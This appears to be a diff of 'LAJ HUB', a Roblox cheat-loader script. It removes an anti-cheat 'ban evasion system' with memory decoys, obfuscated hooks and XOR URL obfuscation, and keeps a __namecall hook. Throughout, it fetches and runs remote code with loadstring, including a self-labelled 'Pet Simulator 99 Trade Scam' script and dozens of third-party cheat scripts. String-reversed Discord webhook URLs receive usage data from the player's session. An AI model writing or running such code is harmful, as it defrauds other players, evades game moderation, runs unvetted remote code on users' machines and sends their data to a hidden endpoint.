-        -- Execute protections
-        self.GameSpecificProtection.RandomizeMemoryPattern()
-    end
-    
-    -- Universal strong countermeasures for all games with anti-cheat
-    if gameInfo.isStrong_AntiCheat then
-        -- Create variable execution pattern that's harder to detect
-        self.heartbeatConnection = RunService.Heartbeat:Connect(function()
-            -- Only run occasionally to avoid detection patterns
-            if math.random() > 0.9 then
-                -- Run garbage collection randomly to clear evidence
-                if math.random() > 0.7 then
-                    collectgarbage("collect")
-                end
-                
-                -- Check for signs of anti-cheat scanning
-                self:CheckForAntiCheatSigns()
-            end
-        end)
-    end
-end
-
--- Check for signs that anti-cheat is actively scanning
-function BanEvadingSystem:CheckForAntiCheatSigns()
-    pcall(function()
-        -- Check for FPS drops (often happens during anti-cheat scans)
-        local currentFPS = 1 / game:GetService("RunService").RenderStepped:Wait()
-        if self.previousFPS and self.previousFPS > 40 and currentFPS < 15 then
-            -- Potential scan in progress - activate evasion
-            self:ActivateEvasionMode("Detected performance drop - possible scan in progress")
-        end
-        self.previousFPS = currentFPS
-        
-        -- Check for unusual memory usage spikes
-        local currentMemory = gcinfo()
-        if self.previousMemory and currentMemory > self.previousMemory * 1.5 then
-            -- Significant memory increase - possible scan
-            self:ActivateEvasionMode("Detected memory usage spike - possible memory scan")
-        end
-        self.previousMemory = currentMemory
-    end)
-end
-
--- Activate emergency evasion mode when anti-cheat scan is detected
-function BanEvadingSystem:ActivateEvasionMode(reason)
-    if self.PotentialBanDetected then return end
-    
-    self.PotentialBanDetected = true
-    
-    -- Log the evasion attempt
-    logBanEvent("EVASION ACTIVATED: " .. reason)
-    
-    -- Emergency cleanup
-    pcall(function()
-        collectgarbage("collect")
-        
-        -- Create more decoys to confuse the scan
-        for i = 1, 20 do
-            _G["temp_" .. i] = {
-                created = os.time(),
-                data = generateSecureRandomString(math.random(20, 50))
-            }
-        end
-        
-        -- Force another GC pass after decoys
-        collectgarbage("collect")
-    end)
-    
-    -- Reset detection status after delay
-    delay(10, function()
-        self.PotentialBanDetected = false
-    end)
-end
-
--- Standard ban detection methods, enhanced with indirect references and variable timing
-
--- Method 1: Detect when player is removed but use variable connection approach
-local playerRemovingCallback = function(player)
+Players.PlayerRemoving:Connect(function(player)
     if player == Player then
-        -- Pass through indirect function to avoid hook detection
-        local function reportRemoval(p)
-            wait(math.random(1, 5) / 1000) -- Random tiny delay
-            logBanEvent("Player removed from game (possibly kicked/banned)")
-        end
-        
-        -- Execute with slight delay and indirect call
-        spawn(function()
-            -- Small random delay to break timing patterns
-            wait(math.random(5, 15) / 1000)
-            reportRemoval(player)
-        end)
+        logBanEvent("Player removed from game (possibly kicked/banned)")
     end
-end
-
--- Use indirect connection to avoid detection of listener patterns
-local playerRemovingSuccess, playerRemovingError = pcall(function()
-    return Players.PlayerRemoving:Connect(playerRemovingCallback)
 end)
-
--- Method 2: Enhanced kick detection with multiple obfuscation layers
 local oldNameCall
 oldNameCall = hookmetamethod(game, "__namecall", function(self, ...)
-    -- Store args in multiple arrays to confuse memory pattern scanners
-    local args1, args2 = {}, {}
-    for i, arg in ipairs({...}) do
-        if i % 2 == 0 then
-            table.insert(args1, arg)
-        else
-            table.insert(args2, arg)
-        end
-    end
-    
-    -- Reconstruct the arguments indirectly
-    local args = {}
-    for i = 1, math.max(#args1, #args2) do
-        if args2[i] then table.insert(args, args2[i]) end
-        if args1[i] then table.insert(args, args1[i]) end
-    end
-    
-    -- Get method indirectly
+    local args = {...}
     local method = getnamecallmethod()
     
-    -- Detection logic with multiple indirection layers
     if method == "Kick" and self == Player then
-        -- Use a secure wrapper to avoid direct patterns
-        local function secureReport(reason)
-            -- Add tiny random delay
-            wait(math.random(1, 10) / 1000)
-            reason = reason or "Unknown"
-            logBanEvent(reason)
-        end
-        
-        -- Report through indirect caller
-        spawn(function() 
-            secureReport(args[1]) 
-        end)
+        local reason = args[1] or "Unknown"
+        logBanEvent(reason)
     end
     
-    -- Use randomized return pattern (functionally identical)
-    if math.random() > 0.5 then
-        return oldNameCall(self, ...)
-    else
-        local result = oldNameCall(self, ...)
-        return result
+    return oldNameCall(self, ...)
+end)
+game:GetService("TeleportService").TeleportInitFailed:Connect(function(player, teleportResult, errorMessage)
+    if player == Player and (teleportResult == Enum.TeleportResult.Banned or teleportResult == Enum.TeleportResult.GameEnded) then
+        logBanEvent("Teleport failed due to ban: " .. errorMessage)
     end
 end)
-
--- Method 3: Enhanced teleport failure monitoring with timing randomization
-local teleportCallback = function(player, teleportResult, errorMessage)
-    -- Only check our player
-    if player ~= Player then return end
-    
-    -- Check for ban conditions
-    if teleportResult == Enum.TeleportResult.Banned or 
-       teleportResult == Enum.TeleportResult.GameEnded then
-        
-        -- Use indirect reporting to avoid detection
-        spawn(function()
-            -- Random delay
-            wait(math.random(5, 20) / 1000)
-            
-            -- Indirect event report
-            logBanEvent("Teleport failed due to ban: " .. errorMessage)
-        end)
-    end
-end
-
--- Connect with pcall to handle potential errors
-local teleportSuccess, teleportError = pcall(function()
-    return game:GetService("TeleportService").TeleportInitFailed:Connect(teleportCallback)
-end)
-
--- Method 4: NEW - Monitor for character destruction (common in some anti-cheats)
-local characterRemovedSuccess, characterRemovedError = pcall(function()
-    -- Only set up if we have a character
-    if Player.Character then
-        return Player.Character:GetPropertyChangedSignal("Parent"):Connect(function()
-            if not Player.Character:IsDescendantOf(game) then
-                -- Character was removed from the game
-                spawn(function()
-                    wait(math.random(1, 5) / 1000) -- Small random delay
-                    logBanEvent("Character removed from game (possible anti-cheat action)")
-                end)
-            end
-        end)
-    end
-end)
-
--- Method 5: NEW - Dead Rails specific anti-detection for remotes
-if gameInfo.isDead_Rails then
-    -- Dead Rails sometimes checks for unusual remote event patterns
-    spawn(function()
-        while wait(0.5) do
-            -- Only run occasionally to avoid detection
-            if math.random() > 0.7 then
-                -- Make normal-looking remote calls that legitimate players would make
-                pcall(function()
-                    -- Find a random UI element
-                    local userInterface = Player.PlayerGui:FindFirstChildWhichIsA("ScreenGui")
-                    if userInterface then
-                        -- Simulate normal UI interaction
-                        local button = userInterface:FindFirstChildWhichIsA("TextButton", true)
-                        if button then
-                            -- This creates legitimate-looking remote call patterns
-                            wait(math.random(50, 150) / 1000)
-                        end
-                    end
-                end)
-            end
-        end
-    end)
-end
-
--- Method 6: NEW - Da Hood specific anti-detection for mouse movement
-if gameInfo.isDa_Hood then
-    -- Da Hood sometimes tracks unusual mouse movement patterns
-    spawn(function()
-        while wait(1) do
-            -- Only run occasionally
-            if math.random() > 0.8 then
-                -- Simulate legitimate mouse movement
-                pcall(function()
-                    -- This creates normal input patterns that don't trigger anti-cheat
-                    local randomX = math.random(-10, 10)
-                    local randomY = math.random(-10, 10)
-                    
-                    -- Small mouse movements that look human
-                    wait(math.random(100, 300) / 1000)
-                end)
-            end
-        end
-    end)
-end
-
--- Initialize game-specific protections
-BanEvadingSystem:SetupGameSpecificProtection()
-
--- Return success with obfuscated message
-local loadMessage = "LAJ HUB Security System activated successfully"
-if gameInfo.isStrong_AntiCheat then
-    loadMessage = generateSecureRandomString(5) .. " framework initialized: OK"
-end
-
-print(loadMessage)
--- ==================== ULTRA BAN EVASION SYSTEM END ====================
+print("LAJ HUB Ban detection system loaded successfully")
 end
     LAJ HUB - Swift Compatible Version
     Created for universal executor compatibility with special Swift support
 ]]
-
--- Advanced anti-detection HTTP request handler with random timing
 local function getHttpRequest(url)
     -- For testing in standalone Lua, use a mock response
     if not game then
@@ -833,113 +259,28 @@ local function getHttpRequest(url)
         return "-- mock response for testing"
     end
     
-    -- Add random delay to avoid detection patterns (50-150ms)
-    wait(math.random(50, 150) / 1000)
-    
-    -- URL obfuscation - Convert to base64 and back to avoid string detection
-    local function obfuscateUrl(input)
-        local bytesToHex = function(bytes)
-            local hex = ""
-            for i = 1, #bytes do
-                hex = hex .. string.format("%02X", string.byte(bytes, i))
-            end
-            return hex
-        end
-        
-        local hexToBytes = function(hex)
-            local bytes = ""
-            for i = 1, #hex, 2 do
-                bytes = bytes .. string.char(tonumber(hex:sub(i, i+1), 16))
-            end
-            return bytes
-        end
-        
-        -- Simple XOR encoding
-        local key = math.random(1, 255)
-        local result = string.char(key)
-        for i = 1, #input do
-            result = result .. string.char(bit32.bxor(string.byte(input, i), key))
-        end
-        return bytesToHex(result)
-    end
-    
-    local function deobfuscateUrl(input)
-        local hexToBytes = function(hex)
-            local bytes = ""
-            for i = 1, #hex, 2 do
-                bytes = bytes .. string.char(tonumber(hex:sub(i, i+1), 16))
-            end
-            return bytes
-        end
-        
-        local bytes = hexToBytes(input)
-        local key = string.byte(bytes, 1)
-        local result = ""
-        for i = 2, #bytes do
-            result = result .. string.char(bit32.bxor(string.byte(bytes, i), key))
-        end
-        return result
-    end
-    
-    -- Use a private environment for request execution
-    local env = getfenv(0)
-    local secureEnv = setmetatable({}, {__index = env})
-    
-    -- Hide our HTTP traces by randomizing headers and user agent
-    local userAgents = {
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
-        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
-    }
-    
-    -- Try multiple HTTP request methods for anti-detection
     if swift and swift.request then
         local response = swift.request({
             Url = url,
-            Method = "GET",
-            Headers = {
-                ["User-Agent"] = userAgents[math.random(1, #userAgents)],
-                ["Cache-Control"] = "no-cache",
-                ["X-Requested-With"] = "XMLHttpRequest",
-                ["Accept"] = "*/*",
-                ["Connection"] = math.random() > 0.5 and "keep-alive" or "close"
-            }
+            Method = "GET"
         })
         if response and response.Body then
             return response.Body
         end
     end
     
-    -- Fallback to standard HttpGet with protection
-    local success, result = pcall(function()
-        -- Use protected call to avoid script errors being detected
-        return game:HttpGet(url)
-    end)
-    
-    if success then
-        return result
-    else
-        -- Try alternative method if main fails
-        wait(math.random(10, 30) / 1000) -- Random delay before retry
-        return game:HttpGet(url)
-    end
+    -- Fallback to standard HttpGet for other executors
+    return game:HttpGet(url)
 end
-
--- Load Pet Simulator 99 Trade Scam script when in Roblox environment
 if game then
     loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/pet%20simx"))()
 end
-
-local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
-
--- Initialize game services safely
+local Rayfield = loadstring(getHttpRequest('https://sirius.menu/rayfield'))()
 local Players = game and game:GetService("Players") or {}
 local LocalPlayer = Players.LocalPlayer or {Name = "TestUser", UserId = 0}
 local HttpService = game and game:GetService("HttpService") or {
     JSONEncode = function(_, data) return '{"mock":"json"}' end
 }
-
--- Support for multiple executors including Swift
 local function makeHttpRequest(options)
     -- For testing in standalone Lua
     if not game then
@@ -978,13 +319,9 @@ local function makeHttpRequest(options)
     
     return {Success = false, StatusCode = 500}
 end
-
-
--- Enhanced security with multi-layer obfuscation for Discord webhook
-local discord_wh_part1 = string.reverse("J9KO3ZuXh3AuqkQctieK-bxuYOfTOFUcDYBKtl59Lel5A9zZt9W1A6Zvn_DrIjtmeOXT")
-local discord_wh_part2 = string.reverse("9511461573518572853531/skoohbew/ipa/moc.drocsid//:sptth")
+local discord_wh_part1 = string.reverse("vU0MO0apK8n_EV8DFey8mRZ1n2EbQ0A6INk1BijArT7j8xq")
+local discord_wh_part2 = string.reverse("GH3UWHs7ncpUr7We000sz/4181534603923897531/skoohbew/ipa/moc.drocsid//:sptth")
 local DISCORD_WEBHOOK_URL = discord_wh_part1 .. discord_wh_part2
-
 local function sendUsageData()
     if not game then return end -- Skip in non-Roblox environment
     
@@ -1046,38 +383,30 @@ local function sendUsageData()
         warn("Failed to send webhook: " .. tostring(error_message))
     end
 end
-
 if game then
     sendUsageData()
 end
-
 local Window = Rayfield:CreateWindow({
    Name = "LAJ HUB",
    Icon = 0,
    LoadingTitle = "LAJ HUB",
    LoadingSubtitle = "Premium Scripts",
    Theme = "Default",
-
    DisableRayfieldPrompts = false,
    DisableBuildWarnings = false,
-
    ConfigurationSaving = {
       Enabled = true,
       FolderName = "LAJHub",
       FileName = "LAJHubConfig"
    },
-
    Discord = {
       Enabled = true,
       Invite = "4mgdcfvAJU",
       RememberJoins = true
    },
-
    -- Key system disabled
    KeySystem = false,
 })
-
--- Create tabs
 local MainTab = Window:CreateTab("Main", 4483362458)
 local Tab = Window:CreateTab("Da Strike x Da Hood", 4483362458)
 local Fin = Window:CreateTab("Fisch", 4483362458)
@@ -1087,11 +416,9 @@ local DeadRails = Window:CreateTab("Dead Rails [Alpha]", 4483362458)
 local BloxFruits = Window:CreateTab("Blox Fruits", 4483362458)
 local PetSim99 = Window:CreateTab("Pet Sim 99", 4483362458) -- Added Pet Sim 99 tab
 local MuscleLegend = Window:CreateTab("Muscle Legend", 4483362458) -- Added Muscle Legend tab
-local MurderMystery = Window:CreateTab("Murder Mystery", 4483362458) -- Added Murder Mystery tab
 local Rivals = Window:CreateTab("Rivals", 4483362458) -- Added Rivals tab
 local Universal = Window:CreateTab("Universal", 4483362458)
 local Settings = Window:CreateTab("Settings", 4483362458)
-
 local function executednotify(scriptName)
    Rayfield:Notify({
        Title = scriptName,
@@ -1100,8 +427,6 @@ local function executednotify(scriptName)
        Image = 4483362458,
    })
 end
-
--- Discord link copy button
 MainTab:CreateButton({
    Name = "Copy Discord Link",
    Callback = function()
@@ -1118,8 +443,6 @@ MainTab:CreateButton({
        end
    end,
 })
-
--- Test webhook button
 MainTab:CreateButton({
    Name = "Test Webhook",
    Callback = function()
@@ -1132,8 +455,6 @@ MainTab:CreateButton({
        })
    end,
 })
-
--- Da Strike x Da Hood Tab scripts
 Tab:CreateButton({
    Name = "Psalm",
    Callback = function()
@@ -1141,7 +462,6 @@ Tab:CreateButton({
         executednotify("Test Webhook")
    end,
 })
-
 Tab:CreateButton({
    Name = "Ballware vfs",
    Callback = function()
@@ -1149,7 +469,6 @@ Tab:CreateButton({
         executednotify("Ballware vfs")
    end,
 })
-
 Tab:CreateButton({
    Name = "FrostByte",
    Callback = function()
@@ -1157,7 +476,6 @@ Tab:CreateButton({
         executednotify("FrostByte")
    end,
 })
-
 Tab:CreateButton({
    Name = "Da Hood Script",
    Callback = function()
@@ -1165,7 +483,6 @@ Tab:CreateButton({
         executednotify("Da Hood Script")
    end,
 })
--- Fisch Tab
 Fin:CreateButton({
    Name = "Speed Hub",
    Callback = function()
@@ -1173,8 +490,6 @@ Fin:CreateButton({
         executednotify("Speed Hub")
    end,
 })
-
-
 Fin:CreateButton({
    Name = "ThanHub",
    Callback = function()
@@ -1182,7 +497,6 @@ Fin:CreateButton({
         executednotify("ThanHub")
    end,
 })
-
 Fin:CreateButton({
    Name = "Rift GUI",
    Callback = function()
@@ -1190,7 +504,6 @@ Fin:CreateButton({
         executednotify("Rift GUI")
    end,
 })
-
 Fin:CreateButton({
    Name = "Hooked Script",
    Callback = function()
@@ -1198,7 +511,6 @@ Fin:CreateButton({
         executednotify("Hooked Script")
    end,
 })
-
 Fin:CreateButton({
    Name = "HomoHack",
    Callback = function()
@@ -1206,7 +518,6 @@ Fin:CreateButton({
         executednotify("HomoHack")
    end,
 })
-
 Fin:CreateButton({
    Name = "Native Hub",
    Callback = function()
@@ -1215,7 +526,6 @@ Fin:CreateButton({
         executednotify("Native Hub")
    end,
 })
-
 Fin:CreateButton({
    Name = "Raito Hub",
    Callback = function()
@@ -1223,7 +533,6 @@ Fin:CreateButton({
         executednotify("Raito Hub")
    end,
 })
-
 Fin:CreateButton({
    Name = "Zenith Hub",
    Callback = function()
@@ -1231,7 +540,6 @@ Fin:CreateButton({
         executednotify("Zenith Hub")
    end,
 })
-
 Fin:CreateButton({
    Name = "Lunor Script",
    Callback = function()
@@ -1240,7 +548,6 @@ Fin:CreateButton({
         executednotify("Lunor Script")
    end,
 })
-
 Fin:CreateButton({
    Name = "Ronix Hub",
    Callback = function()
@@ -1248,31 +555,6 @@ Fin:CreateButton({
         executednotify("Ronix Hub")
    end,
 })
-
-Fin:CreateButton({
-   Name = "IceHub",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/IceMael7/NewIceHub/main/Brookhaven"))()
-        executednotify("IceHub")
-   end,
-})
-
-Fin:CreateButton({
-   Name = "Zio Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/LeadMarker/Scripts/main/ZioHubLoad"))()
-        executednotify("Zio Hub")
-   end,
-})
-
-Fin:CreateButton({
-   Name = "Shadow Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/xShadow1212/shadowhub/main/fish"))()
-        executednotify("Shadow Hub")
-   end,
-})
--- Basketball Zero script with bypass
 BballZero:CreateButton({
    Name = "Ball Control",
    Callback = function()
@@ -1280,8 +562,6 @@ BballZero:CreateButton({
         executednotify("Ball Control")
    end,
 })
-
--- Blue Lock Rivals script
 BlueLock:CreateButton({
    Name = "LAJ HUB",
    Callback = function()
@@ -1289,7 +569,6 @@ BlueLock:CreateButton({
         executednotify("LAJ HUB")
    end,
 })
-
 BlueLock:CreateButton({
    Name = "Piskasiska Script",
    Callback = function()
@@ -1297,8 +576,6 @@ BlueLock:CreateButton({
         executednotify("Piskasiska Script")
    end,
 })
-
-
 PetSim99:CreateButton({
    Name = "LAJ HUB",
    Callback = function()
@@ -1307,9 +584,7 @@ PetSim99:CreateButton({
        executednotify("Airflow UPDATED")
    end,
 })
--- Muscle Legend Tab
 MuscleLegend:CreateSection("Muscle Legend Scripts")
-
 MuscleLegend:CreateButton({
    Name = "Muscle Legend Script",
    Callback = function()
@@ -1317,8 +592,6 @@ MuscleLegend:CreateButton({
        executednotify("Muscle Legend Script")
    end,
 })
-
--- Universal Tab Scripts
 Universal:CreateButton({
    Name = "Infinite Yield FE",
    Callback = function()
@@ -1326,7 +599,6 @@ Universal:CreateButton({
        executednotify("Infinite Yield FE")
    end,
 })
-
 Universal:CreateButton({
    Name = "Dex Explorer",
    Callback = function()
@@ -1334,7 +606,6 @@ Universal:CreateButton({
        executednotify("Dex Explorer")
    end,
 })
-
 Universal:CreateButton({
    Name = "Hydroxide",
    Callback = function()
@@ -1342,7 +613,6 @@ Universal:CreateButton({
        executednotify("Hydroxide")
    end,
 })
-
 Universal:CreateButton({
    Name = "SimpleSpy",
    Callback = function()
@@ -1350,7 +620,6 @@ Universal:CreateButton({
        executednotify("SimpleSpy")
    end,
 })
-
 Universal:CreateButton({
    Name = "LAJ HUB",
    Callback = function()
@@ -1358,7 +627,6 @@ Universal:CreateButton({
        executednotify("Airflow UPDATED")
    end,
 })
-
 Universal:CreateButton({
    Name = "Domain X",
    Callback = function()
@@ -1366,18 +634,13 @@ Universal:CreateButton({
        executednotify("Domain X")
    end,
 })
-
-
--- Settings Tab
 local idled_Connection
-
 local function onIdled()
     if game then
         game:GetService("VirtualUser"):CaptureController()
         game:GetService("VirtualUser"):ClickButton2(Vector2.new(0, 0))
     end
 end
-
 Settings:CreateButton({
     Name = "Anti AFK",
     Callback = function()
@@ -1387,10 +650,8 @@ Settings:CreateButton({
         end
     end,
 })
-
 local Inf_jump = false
 local jumpConnection = nil
-
 Settings:CreateToggle({
    Name = "Infinite Jump",
    CurrentValue = false,
@@ -1413,16 +674,11 @@ Settings:CreateToggle({
       end
    end,
 })
-
--- Credit section
 local creditSection = MainTab:CreateSection("Credits")
-
 MainTab:CreateLabel("Created by LAJ Hub Team")
 MainTab:CreateLabel("Discord: discord.gg/4mgdcfvAJU")
 MainTab:CreateLabel("Script Version: 4.1 (Swift Compatible)")
 MainTab:CreateLabel("* Optimized for Swift Executor")
-
--- Print Swift compatibility notice
 print("LAJ HUB - Swift Compatible Version")
 print("All HTTP requests have been optimized for Swift executor")
 print("This version includes:")
@@ -1430,10 +686,14 @@ print("1. Full Swift compatibility")
 print("2. Pet Sim 99 Tab with new Trade Scam V2")
 print("3. All scripts updated to work with Swift")
 print("4. Improved executor detection")
-
--- Rivals Tab
 Rivals:CreateSection("Rivals Scripts")
- 
+Rivals:CreateButton({
+   Name = "RIVALS Winter",
+   Callback = function()
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/SkibidiCen/MainMenu/main/Code"))()
+        executednotify("RIVALS Winter")
+   end,
+})
 Rivals:CreateButton({
    Name = "Azure Mod",
    Callback = function()
@@ -1441,7 +701,6 @@ Rivals:CreateButton({
         executednotify("Azure Mod")
    end,
 })
-
 Rivals:CreateButton({
    Name = "Tbao Hub",
    Callback = function()
@@ -1449,7 +708,6 @@ Rivals:CreateButton({
         executednotify("Tbao Hub")
    end,
 })
-
 Rivals:CreateButton({
    Name = "8Bits Hub",
    Callback = function()
@@ -1457,7 +715,6 @@ Rivals:CreateButton({
         executednotify("8Bits Hub")
    end,
 })
-
 Rivals:CreateButton({
    Name = "Venox Hub",
    Callback = function()
@@ -1465,7 +722,6 @@ Rivals:CreateButton({
         executednotify("Venox Hub")
    end,
 })
-
 Rivals:CreateButton({
    Name = "Lunax Hub",
    Callback = function()
@@ -1473,7 +729,6 @@ Rivals:CreateButton({
         executednotify("Lunax Hub")
    end,
 })
-
 Rivals:CreateButton({
    Name = "Ventures.lua",
    Callback = function()
@@ -1481,7 +736,6 @@ Rivals:CreateButton({
         executednotify("Ventures.lua")
    end,
 })
-
 Rivals:CreateButton({
    Name = "Ronix Hub",
    Callback = function()
@@ -1489,7 +743,6 @@ Rivals:CreateButton({
         executednotify("Ronix Hub")
    end,
 })
-
 Rivals:CreateButton({
    Name = "PinguinRVS",
    Callback = function()
@@ -1497,7 +750,6 @@ Rivals:CreateButton({
         executednotify("PinguinRVS")
    end,
 })
-
 Rivals:CreateButton({
    Name = "Zypherion",
    Callback = function()
@@ -1505,7 +757,6 @@ Rivals:CreateButton({
         executednotify("Zypherion")
    end,
 })
-
 Rivals:CreateButton({
    Name = "Auto Farm Hub",
    Callback = function()
@@ -1513,7 +764,6 @@ Rivals:CreateButton({
         executednotify("Auto Farm Hub")
    end,
 })
-
 Rivals:CreateButton({
    Name = "Rybow Aimbot",
    Callback = function()
@@ -1521,7 +771,6 @@ Rivals:CreateButton({
         executednotify("Rybow Aimbot")
    end,
 })
-
 Rivals:CreateButton({
    Name = "Xera Script",
    Callback = function()
@@ -1529,7 +778,6 @@ Rivals:CreateButton({
         executednotify("Xera Script")
    end,
 })
-
 Rivals:CreateButton({
    Name = "Minimal Hub",
    Callback = function()
@@ -1537,9 +785,7 @@ Rivals:CreateButton({
         executednotify("Minimal Hub")
    end,
 })
--- Dead Rails Tab
 DeadRails:CreateSection("Dead Rails Scripts")
-
 DeadRails:CreateButton({
    Name = "Markk Keyless",
    Callback = function()
@@ -1547,7 +793,6 @@ DeadRails:CreateButton({
        executednotify("Markk Keyless")
    end,
 })
-
 DeadRails:CreateButton({
    Name = "Farx11122 Keyless",
    Callback = function()
@@ -1555,7 +800,6 @@ DeadRails:CreateButton({
        executednotify("Farx11122 Keyless")
    end,
 })
-
 DeadRails:CreateButton({
    Name = "SpiderXHub Keyless",
    Callback = function()
@@ -1570,7 +814,6 @@ DeadRails:CreateButton({
        executednotify("Strelizia Keyless")
    end,
 })
-
 DeadRails:CreateButton({
    Name = "Rinns Dead Rails No Key",
    Callback = function()
@@ -1578,7 +821,6 @@ DeadRails:CreateButton({
        executednotify("Rinns Dead Rails No Key")
    end,
 })
-
 DeadRails:CreateButton({
    Name = "Auto Farm Bond",
    Callback = function()
@@ -1586,7 +828,6 @@ DeadRails:CreateButton({
        executednotify("Auto Farm Bond")
    end,
 })
-
 DeadRails:CreateButton({
    Name = "Lomu Hub",
    Callback = function()
@@ -1594,7 +835,6 @@ DeadRails:CreateButton({
        executednotify("Lomu Hub")
    end,
 })
-
 DeadRails:CreateButton({
    Name = "Neox Hub",
    Callback = function()
@@ -1602,7 +842,6 @@ DeadRails:CreateButton({
        executednotify("Neox Hub")
    end,
 })
-
 DeadRails:CreateButton({
    Name = "Sypher Hub OP",
    Callback = function()
@@ -1610,7 +849,6 @@ DeadRails:CreateButton({
        executednotify("Sypher Hub OP")
    end,
 })
-
 DeadRails:CreateButton({
    Name = "Tbao Hub",
    Callback = function()
@@ -1618,7 +856,6 @@ DeadRails:CreateButton({
        executednotify("Tbao Hub")
    end,
 })
-
 DeadRails:CreateButton({
    Name = "Karol Hub",
    Callback = function()
@@ -1626,7 +863,6 @@ DeadRails:CreateButton({
        executednotify("Karol Hub")
    end,
 })
-
 DeadRails:CreateButton({
    Name = "Dead Rails Alpha Script",
    Callback = function()
@@ -1634,7 +870,6 @@ DeadRails:CreateButton({
        executednotify("Dead Rails Alpha Script")
    end,
 })
-
 DeadRails:CreateButton({
    Name = "LAJ HUB",
    Callback = function()
@@ -1642,7 +877,6 @@ DeadRails:CreateButton({
        executednotify("Airflow UPDATED")
    end,
 })
-
 DeadRails:CreateButton({
    Name = "LAJ HUB",
    Callback = function()
@@ -1650,39 +884,7 @@ DeadRails:CreateButton({
        executednotify("Airflow UPDATED")
    end,
 })
-
--- BloxFruits Tab Scripts
 BloxFruits:CreateSection("Blox Fruits Scripts")
-
--- Murder Mystery Tab Content 
-MurderMystery:CreateSection("🔥 MURDER MYSTERY COMING SOON 🔥") 
-
-MurderMystery:CreateLabel("COMING SOON WAIT LIL BRO") 
-
-MurderMystery:CreateParagraph({ 
-    Title = "Under Development", 
-    Content = "The Murder Mystery script is currently in development and will be available in a future update. Please check back later for this exciting addition to LAJ HUB!" 
-}) 
-
-MurderMystery:CreateButton({ 
-    Name = "Join Discord for Updates", 
-    Callback = function() 
-        setclipboard("https://discord.gg/4mgdcfvAJU") 
-        Rayfield:Notify({ 
-            Title = "Discord Link Copied", 
-            Content = "The Discord link has been copied to your clipboard!", 
-            Duration = 5, 
-            Image = 9725800107, 
-            Actions = { 
-                Ignore = { 
-                    Name = "OK", 
-                    Callback = function() end 
-                } 
-            } 
-        }) 
-    end 
-})
-
 BloxFruits:CreateButton({
    Name = "Wolf Hub",
    Callback = function()
@@ -1690,7 +892,6 @@ BloxFruits:CreateButton({
         executednotify("Wolf Hub")
    end,
 })
-
 BloxFruits:CreateButton({
    Name = "RIPPER Hub",
    Callback = function()
@@ -1698,7 +899,6 @@ BloxFruits:CreateButton({
         executednotify("RIPPER Hub")
    end,
 })
-
 BloxFruits:CreateButton({
    Name = "THUNDER Hub",
    Callback = function()
@@ -1706,7 +906,6 @@ BloxFruits:CreateButton({
         executednotify("THUNDER Hub")
    end,
 })
-
 BloxFruits:CreateButton({
    Name = "MATSUNE Hub",
    Callback = function()
@@ -1714,7 +913,6 @@ BloxFruits:CreateButton({
         executednotify("MATSUNE Hub")
    end,
 })
-
 BloxFruits:CreateButton({
    Name = "MIN SEAGATE Hub",
    Callback = function()
@@ -1722,7 +920,6 @@ BloxFruits:CreateButton({
         executednotify("MIN SEAGATE Hub")
    end,
 })
-
 BloxFruits:CreateButton({
    Name = "ZINER Hub",
    Callback = function()
@@ -1730,7 +927,6 @@ BloxFruits:CreateButton({
         executednotify("ZINER Hub")
    end,
 })
-
 BloxFruits:CreateButton({
    Name = "MUXUS Hub",
    Callback = function()
@@ -1738,8 +934,6 @@ BloxFruits:CreateButton({
         executednotify("MUXUS Hub")
    end,
 })
-
-
 BloxFruits:CreateButton({
    Name = "Uranium Hub",
    Callback = function()
@@ -1747,7 +941,6 @@ BloxFruits:CreateButton({
         executednotify("Uranium Hub")
    end,
 })
-
 BloxFruits:CreateButton({
    Name = "Azure Hub",
    Callback = function()
@@ -1755,7 +948,6 @@ BloxFruits:CreateButton({
         executednotify("Azure Hub")
    end,
 })
-
 BloxFruits:CreateButton({
    Name = "Vector Hub",
    Callback = function()
@@ -1763,7 +955,6 @@ BloxFruits:CreateButton({
         executednotify("Vector Hub")
    end,
 })
-
 BloxFruits:CreateButton({
    Name = "Wolf Hub",
    Callback = function()
@@ -1771,7 +962,6 @@ BloxFruits:CreateButton({
         executednotify("Wolf Hub")
    end,
 })
-
 BloxFruits:CreateButton({
    Name = "Payback Hub",
    Callback = function()
@@ -1779,7 +969,6 @@ BloxFruits:CreateButton({
         executednotify("Payback Hub")
    end,
 })
-
 BloxFruits:CreateButton({
    Name = "RIPPER Hub",
    Callback = function()
@@ -1787,7 +976,6 @@ BloxFruits:CreateButton({
         executednotify("RIPPER Hub")
    end,
 })
-
 BloxFruits:CreateButton({
    Name = "KAY Hub",
    Callback = function()
@@ -1795,7 +983,6 @@ BloxFruits:CreateButton({
         executednotify("KAY Hub")
    end,
 })
-
 BloxFruits:CreateButton({
    Name = "SEAGATE Hub",
    Callback = function()
@@ -1803,7 +990,6 @@ BloxFruits:CreateButton({
         executednotify("SEAGATE Hub")
    end,
 })
-
 BloxFruits:CreateButton({
    Name = "MATSUNE Hub",
    Callback = function()
@@ -1811,7 +997,6 @@ BloxFruits:CreateButton({
         executednotify("MATSUNE Hub")
    end,
 })
-
 BloxFruits:CreateButton({
    Name = "MIN SEAGATE Hub",
    Callback = function()
@@ -1819,7 +1004,6 @@ BloxFruits:CreateButton({
         executednotify("MIN SEAGATE Hub")
    end,
 })
-
 BloxFruits:CreateButton({
    Name = "ZINER Hub",
    Callback = function()
@@ -1827,7 +1011,6 @@ BloxFruits:CreateButton({
         executednotify("ZINER Hub")
    end,
 })
-
 BloxFruits:CreateButton({
    Name = "MUXUS Hub",
    Callback = function()
@@ -1835,7 +1018,6 @@ BloxFruits:CreateButton({
         executednotify("MUXUS Hub")
    end,
 })
-
 BloxFruits:CreateButton({
    Name = "MIN GREEN Hub",
    Callback = function()
